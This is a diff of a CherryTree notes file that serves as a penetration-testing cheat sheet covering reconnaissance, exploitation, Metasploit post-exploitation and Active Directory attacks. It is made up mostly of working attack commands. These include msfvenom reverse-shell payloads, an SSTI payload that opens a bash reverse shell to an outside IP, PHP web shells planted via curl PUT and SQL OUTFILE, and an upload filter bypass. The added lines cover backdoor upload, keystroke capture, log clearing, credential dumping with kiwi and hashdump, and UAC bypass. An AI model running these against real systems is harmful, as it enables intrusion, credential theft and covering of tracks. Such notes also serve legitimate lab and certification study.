-bad = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
-
-
+      <rich_text weight="heavy">Download/Upload Files</rich_text>
+      <rich_text>
+download C:\\Users\\Administrator\\Desktop\\user.txt
+upload backdoor.exe C:\\Users\\Administrator\\Desktop\\backdoor.exe
 
 </rich_text>
-    <rich_text scale="h3">Spiking</rich_text>
-    <rich_text>
-# trun.spk 
-s_readline(); 
-s_string("TRUN "); 
-s_string_variable("0;) 
-
-generic_send_tcp &lt;HOST&gt; &lt;PORT&gt; trun.spk 0 0
+      <rich_text weight="heavy">Edit Files</rich_text>
+      <rich_text>
+edit &lt;file&gt;
 
 </rich_text>
-    <rich_text scale="h3">Generate pattern:</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text justification="center" family="monospace" style="italic" background="#ffffffffffff" foreground="#000000000000">/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1000</rich_text>
-    <rich_text>
-
+      <rich_text weight="heavy">Execute Programs/Tasks</rich_text>
+      <rich_text>
+execute -f cmd.exe -i H
 
 </rich_text>
-    <rich_text scale="h3">Get the offset:</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 1000 -q </rich_text>
-    <rich_text style="italic" background="#ffffffffffff" foreground="#000000000000">&lt;ACCESS VIOLATION&gt;</rich_text>
-    <rich_text>
+      <rich_text weight="heavy">Search for Files</rich_text>
+      <rich_text>
+search -f flag.*
 
 </rich_text>
-    <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">!mona findmsp</rich_text>
-    <rich_text>
-
-• The manual way is to send bytes and overwrite EIP. Use A's and B's in order to diferentiate
-</rich_text>
-    <rich_text style="italic">• To reach EIP you increase 4 bytes after the Offset.</rich_text>
-    <rich_text>
-
+      <rich_text weight="heavy">Run Scripts</rich_text>
+      <rich_text>
+run post/windows/gather/enum_applications
 
 </rich_text>
-    <rich_text scale="h3">0x03 Fuzz for badchars.</rich_text>
-    <rich_text>
+      <rich_text weight="heavy">Migrate Session to another process</rich_text>
+      <rich_text>
+getpid payload.exe
+run post/windows/manage/migrate (notepad.exe default)
+migrate &lt;PID&gt;
 
 </rich_text>
-    <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">buffer = "A" * &lt;OFFSET&gt; + "BBBB" + bad</rich_text>
-    <rich_text>
-
-
-</rich_text>
-    <rich_text scale="h3">0x04 Identify the Return Address:</rich_text>
-    <rich_text>
-
-• Look for JMP ESP on the binary or a DLL without ASLR
+      <rich_text weight="heavy">Capture Keystrokes</rich_text>
+      <rich_text>
+keyscan_start/stop
 
 </rich_text>
-    <rich_text scale="h3">0x05 </rich_text>
-    <rich_text>Generate ShellCode
-
-msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.34 LPORT=4444 -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload</rich_text>
-    <rich_text justification="center" style="italic">
+      <rich_text weight="heavy">Clear Logs</rich_text>
+      <rich_text>
+clearev
 
 </rich_text>
-    <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 EXITFUNC=thread -b "\x00" -f c</rich_text>
-    <rich_text justification="center" style="italic"> </rich_text>
-    <rich_text>
+      <rich_text weight="heavy">Dump cleartext credentials &amp; hashes with Kiwi</rich_text>
+      <rich_text>
+load kiwi
+creds_all
 
 </rich_text>
-    <rich_text scale="h3">Tips</rich_text>
-    <rich_text>
-• strings command
-
-
-
-
-
+      <rich_text weight="heavy">Dump hashes</rich_text>
+      <rich_text>
+hashdump
 
 </rich_text>
-    <rich_text scale="h2" weight="heavy">WordPress</rich_text>
-    <rich_text>
-
-WPScan Brute-force:
-
-wpscan --url &lt;TARGET&gt; -U &lt;USER&gt; -P /usr/share/wordlists/rockyou.txt
-
-Agressive Enumeration:
-
-wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u1-20,m --plugins-detection aggressive
-
+      <rich_text weight="heavy">Pivoting</rich_text>
+      <rich_text>
+run autoroute -s &lt;ip/range&gt;
 
 </rich_text>
-    <rich_text scale="h2" weight="heavy">General Reconnaissance</rich_text>
-    <rich_text>
-
-</rich_text>
-    <rich_text weight="heavy">Host Discovery</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text weight="heavy">
-</rich_text>
-    <rich_text>nmap -sP &lt;subnet&gt;
-
-netdiscover -i &lt;network_interface&gt; -r &lt;ip_range&gt;
-
-
-</rich_text>
-    <rich_text weight="heavy">Domain Discovery</rich_text>
-    <rich_text>
-
-nslookup &lt;ip_address&gt;
-
-dig @&lt;host1_ip&gt; -x &lt;another_host_ip&gt; +nocookie
-
-dig @&lt;ip&gt; &lt;domain&gt; -t AXFR +nocookie
-
-
-</rich_text>
-    <rich_text weight="heavy">Identify default gateway of a host/subnet</rich_text>
-    <rich_text>
-route
-
-traceroute &lt;ip&gt; -m 5 -T</rich_text>
-    <rich_text weight="heavy">
-</rich_text>
-    <rich_text>
-
-</rich_text>
-    <rich_text scale="h2" weight="heavy">General Enumeration</rich_text>
-    <rich_text>
-
-</rich_text>
-    <rich_text weight="heavy">SNMP</rich_text>
-    <rich_text>
-
-BRUTE-FORCE COMMUNITIES
-onesixtyone -c &lt;wordlist&gt; -p 161 &lt;host&gt;
-
-ENUMERATE WINDOWS USERS
-snmpwalk -c &lt;community&gt; -v1 &lt;host&gt; 10.10.10.5 1.3.6.1.4.1.77.1.2.25
-
-nmap -sU -p 161 --script=snmp-win32-services &lt;host&gt;
-
-nmap -sU -p 161 &lt;host&gt; --script snmp-brute (/usr/share/nmap/nselib/data/snmpcommunities.lst)
---script-args snmp-brute.communitiesdb=&lt;wordlist&gt;
-
-List software installed on the machine
-snmpwalk -c &lt;community_string&gt; -v1 &lt;host&gt; hrSWInstalledName
-
-</rich_text>
-    <rich_text weight="heavy">SMB</rich_text>
-    <rich_text>
-nmap -sC --script=smb-enum-users 192.168.201.14
-
-</rich_text>
-    <rich_text weight="heavy">POP3</rich_text>
-    <rich_text>
-
-user &lt;user&gt;
-pass &lt;pass&gt;
-list
-retr &lt;email id&gt;
-
-</rich_text>
-    <rich_text weight="heavy">Send files</rich_text>
-    <rich_text>
-
-smbmap -H 192.168.201.17 -u david -p qwertyuioplkjhgfdsazxcvbnm --upload /home/xcatolin/rev.php secured\\rev.php
-
-UDP
-nmap -vv — reason -Pn -sU -A — top-ports=20 — version-all
-
-
-</rich_text>
-    <rich_text weight="heavy">Connect and enumerate databases</rich_text>
-    <rich_text>
-
-mysql -h 192.168.201.11 -u root -p
-
-
-</rich_text>
-    <rich_text weight="heavy">Ping Sweep</rich_text>
-    <rich_text>
-
-fping -g -r 1 172.16.37.0/24
-
-
-</rich_text>
-    <rich_text weight="heavy">RPCbind</rich_text>
-    <rich_text>
-
-rpcinfo -p &lt;host&gt;
-
-# showmount -e 192.168.201.8
-Export list for 192.168.201.8:
-/home/vulnix *
-
-mount -t nfs 192.168.201.8:/home /share
-
-
-</rich_text>
-    <rich_text weight="heavy">Crunch</rich_text>
-    <rich_text>
-
-Generating from a specific pattern
-
-crunch 13 13 -t bev,%%@@^1995 -o bigtom
-
-@ lowercase
-, uppercase
-% numbers
-^ special chars
-
-
-</rich_text>
-    <rich_text weight="heavy">Hydra Brute-forcing</rich_text>
-    <rich_text>
-
-• POP3: hydra -L &lt;USER LIST&gt; -P &lt;PASS LIST&gt; -t20 &lt;HOST&gt; -s&lt;PORT&gt; -I pop3
-
-hydra -l admin -P pass.txt 192.168.71.129 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed"
-
-</rich_text>
-    <rich_text weight="heavy">Brute-forcing Subdomains</rich_text>
-    <rich_text>
-wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "</rich_text>
-    <rich_text link="webs http://cmess.thm/">http://cmess.thm/</rich_text>
-    <rich_text>" -H "Host: FUZZ.cmess.thm" --hw 290
-</rich_text>
-    <rich_text weight="heavy">
-Brute-force a single param</rich_text>
-    <rich_text>
-hydra -l "" -P /usr/share/dirb/wordlists/big.txt 192.168.174.10 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^&amp;Login=Login:invalid key" -f
-
-
-</rich_text>
-    <rich_text weight="heavy">MSSQL enum</rich_text>
-    <rich_text>
-
-nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=fooadmin,mssql.password=fooadmin,ms-sql-xp-cmdshell.cmd="whoami" 172.16.64.199
-
-
-</rich_text>
-    <rich_text weight="heavy">Modifying values on MySQL</rich_text>
-    <rich_text>
-
-update users set adm="yes" where username="tracking1";
-
-
-</rich_text>
-    <rich_text scale="h2" weight="heavy">General Exploitation</rich_text>
-    <rich_text>
-
-</rich_text>
-    <rich_text weight="heavy">SSTI</rich_text>
-    <rich_text>
-
-{% import os %}{{os.system('bash -c "bash -i &gt;&amp; /dev/tcp/192.168.201.26/1234 0&gt;&amp;1"')}}
-
-</rich_text>
-    <rich_text weight="heavy">LFI</rich_text>
-    <rich_text>
-
-• Test between GET, POST and different Encoding methods
-
-FreeBSD
-/usr/local/etc/apacheX/httpd.conf
-
-</rich_text>
-    <rich_text weight="heavy">RFI</rich_text>
-    <rich_text>
-python3 -m http.server
-endpoint.php?param=http://localhost:8000/rev.php
-
-
-</rich_text>
-    <rich_text weight="heavy">File Upload with cURL PUT</rich_text>
-    <rich_text>
-
-curl -vX PUT -d '&lt;?php system($_GET["cmd"]);?&gt;' </rich_text>
-    <rich_text link="webs http://192.168.201.7/test/xcatolin.php">http://192.168.201.7/test/xcatolin.php</rich_text>
-    <rich_text>
-
-</rich_text>
-    <rich_text weight="heavy">PTY Spawning</rich_text>
-    <rich_text>
-/usr/bin/script -qc /bin/bash /dev/null
-
-stty raw -echo
-
-
-phpmyadmin command injection
-
-SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/wordpress/shell.php"
-
-
-</rich_text>
-    <rich_text weight="heavy">PHP Command Injection/Execution</rich_text>
-    <rich_text>
-
-echo "&lt;pre&gt;";system("ls -la /var/www");echo"&lt;\pre&gt;";
-
- 
-</rich_text>
-    <rich_text weight="heavy">File Upload Bypass Magic Bytes</rich_text>
-    <rich_text>
-That makes so that the file header is a jpeg, the extension a gif and the content of php
- 
- echo 'FFD8FFEo' | xxd -r -p &gt; xca.gif
- echo '&lt;?php $c=$_GET['c']; echo `$c`; ?&gt;' &gt;&gt; xca.gif
-
-
-</rich_text>
-    <rich_text scale="h3" weight="heavy">Windows</rich_text>
-    <rich_text>
-C:/Windows/System32/Config/SAM
-C:/Windows/System32/Config/SYSTEM
-Those are locked while system is running.
-
-C:/Windows/System32/config/RegBack - This is accessible through LFI and stuff.
-
-
-</rich_text>
-    <rich_text family="monospace" scale="h3" background="#ffffffffffff" foreground="#000000000000">General Post-exploitation</rich_text>
-    <rich_text>
-
-</rich_text>
-    <rich_text weight="heavy">Update SQL Database</rich_text>
-    <rich_text>
-
-update &lt;table&gt;
-set &lt;item&gt;='new_content' where &lt;item&gt;='item';
-set pwd='admin' where login='admin';
-
-
-</rich_text>
-    <rich_text weight="heavy">Escape rbash with SSH:</rich_text>
-    <rich_text>
-
-ssh mindy@192.168.201.19 -t "bash --noprofile"
-
-
-</rich_text>
-    <rich_text scale="h3" weight="heavy">Pivoting &amp; Port Forwarding</rich_text>
-    <rich_text>
-
-
-</rich_text>
-    <rich_text weight="heavy">Socat</rich_text>
-    <rich_text>
-socat TCP-LISTEN:&lt;local_port&gt;,fork,reuseaddr TCP:&lt;remote_ip&gt;:&lt;remote_port&gt; &amp;
-
-</rich_text>
-    <rich_text weight="heavy">cURL</rich_text>
-    <rich_text>
-curl --proxy http://192.168.1.45:31337 127.0.0.1:8080
-
-</rich_text>
-    <rich_text weight="heavy">SSH</rich_text>
-    <rich_text>
-ssh -L 3000:homepc:23 user@ssh-server
-localport:remotehost:remoteport
-
-</rich_text>
-    <rich_text weight="heavy">Ncat</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text style="italic">ncat -l -v -p 2222 -c 'ncat 172.16.50.222 22'</rich_text>
-    <rich_text>
-
-
-</rich_text>
-    <rich_text weight="heavy">SSH (22) through Squid Proxy (3128)</rich_text>
-    <rich_text>
-proxytunnel -p 192.168.201.9:3128 -d 127.0.0.1:22 -a 1234
-
-there was a squid proxy running on 3128 and a filtered SSH on 22, so that command basically tunnels to 3128 -&gt; 22 -&gt; 1234 on localhost
-
-then ssh user@127.0.0.1 -p 1234
-
-
-</rich_text>
-    <rich_text weight="heavy">Tunneling with Chisel</rich_text>
-    <rich_text>
-
-On local machine;
-chisel server -p 8001 --reverse
-
-On foothold attacked machine;
-./chisel client lhost:8001 R:8000:127.0.0.1:8000
-
-8000 é a porta que tava aberta só pra localhost no alvo, e 8001 é a porta que ficou escutando na minha máquina.
-
-remote:8000 -&gt; local:8001 -&gt; local:8000
-
-
-
-</rich_text>
-    <rich_text family="monospace" scale="h3" background="#ffffffffffff" foreground="#000000000000">Metasploit</rich_text>
-    <rich_text>
-
-</rich_text>
-    <rich_text weight="heavy">Pivoting</rich_text>
-    <rich_text>
-meterpreter &gt; run autoroute -s &lt;ip/range&gt;
-
-</rich_text>
-    <rich_text weight="heavy">Host discovery</rich_text>
-    <rich_text>
+      <rich_text weight="heavy">Host discovery</rich_text>
+      <rich_text>
 auxiliary/scanner/portscan/tcp - specific ports/possible ports
 
 </rich_text>
-    <rich_text weight="heavy">Impersonation</rich_text>
-    <rich_text>
-meterpreter &gt; use incognito
-meterpreter &gt; list_tokens -u
+      <rich_text weight="heavy">Token Impersonation</rich_text>
+      <rich_text>
+use incognito
+list_tokens -u
 
-meterpreter &gt; impersonate_token &lt;hostname\\user&gt;
-meterpreter &gt; shell
+impersonate_token &lt;hostname\\user&gt;
+shell
 
 </rich_text>
-    <rich_text weight="heavy">SMB</rich_text>
-    <rich_text>
+      <rich_text weight="heavy">SMB</rich_text>
+      <rich_text>
 net use K: \\destiny_ip\share
 K:
 
-
+</rich_text>
+      <rich_text weight="heavy">SMB Relay</rich_text>
+      <rich_text>
+exploit/windows/smb/smb_relay
+&lt;a href="file://\\172.16.5.150\admin$"&gt;here&lt;/a&gt;
 
 </rich_text>
-    <rich_text scale="h3" weight="heavy">Active Directory</rich_text>
-    <rich_text>
+      <rich_text weight="heavy">Escalate Privileges</rich_text>
+      <rich_text>
+getsystem
 
 </rich_text>
-    <rich_text weight="heavy">AS-Rep Roasting</rich_text>
-    <rich_text>
+      <rich_text weight="heavy">Bypass User Account Control</rich_text>
+      <rich_text>
+post/windows/gather/win_privs
+exploit/windows/local/bypassuac*</rich_text>
+    </node>
+    <node name="Active Directory" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344242" ts_lastsave="1639344840">
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">AS-Rep Roasting</rich_text>
+      <rich_text>
 
 </rich_text>
-    <rich_text style="italic">Authentication Server Request (AS-Req)</rich_text>
-    <rich_text>
+      <rich_text style="italic">Authentication Server Request (AS-Req)</rich_text>
+      <rich_text>
 Client asks the Kerberos Key Distribution Center for a ticket-granting ticket, sending an encrypted timestamp along with the request. 
 
 </rich_text>
-    <rich_text style="italic">Authentication Server Reply (AS-Rep)</rich_text>
-    <rich_text>
+      <rich_text style="italic">Authentication Server Reply (AS-Rep)</rich_text>
+      <rich_text>
 The KDC responds with a ticket-granting ticket for the client, and part of that reply contains data encrypted which contains the client's password, so it's possible to crack this hash
 
 When Kerberos pre-auth is disabled, the AS-Req is not going to send the encrypted timestamp, so it's not necessary to know the victim's password to get the AS-Rep back.
@@ -631,8 +757,8 @@ When Kerberos pre-auth is disabled, the AS-Req is not going to send the encrypte
 
 
 </rich_text>
-    <rich_text scale="h3" weight="heavy">Kerberoasting</rich_text>
-    <rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Kerberoasting</rich_text>
+      <rich_text>
 
 Service Principal Names (SPNs) are used by Kerberos Authentication to associate a service instance with a service logon account. The SPN acts as a pointer to the domain account running the service.
 
@@ -642,28 +768,24 @@ MSSQLsvc/sql1@ad.local
 
 
 </rich_text>
-    <rich_text weight="heavy">LLMNR Poisoning</rich_text>
-    <rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">LLMNR Poisoning</rich_text>
+      <rich_text>
 
 responder -I &lt;network_interface&gt;
 
 </rich_text>
-    <rich_text weight="heavy">Impersonate user with Responder-MultiRelay</rich_text>
-    <rich_text>
+      <rich_text weight="heavy">Impersonate user with Responder-MultiRelay</rich_text>
+      <rich_text>
 
 multirelay -t &lt;machine_ip&gt; -u ALL
 
 </rich_text>
-    <rich_text weight="heavy">Upgrade Shell to Meterpreter</rich_text>
-    <rich_text>
+      <rich_text weight="heavy">Upgrade Shell to Meterpreter</rich_text>
+      <rich_text>
 
 exploit/multi/scripts/web_delivery
 
-set srvhost, target 2, payload, lhost, lport, exitonsession, exploit -j
-
-
-
-Close port
-sudo kill $(sudo lsof -t -i:445)</rich_text>
+set srvhost, target 2, payload, lhost, lport, exitonsession, exploit -j</rich_text>
+    </node>
   </node>
 </cherrytree>
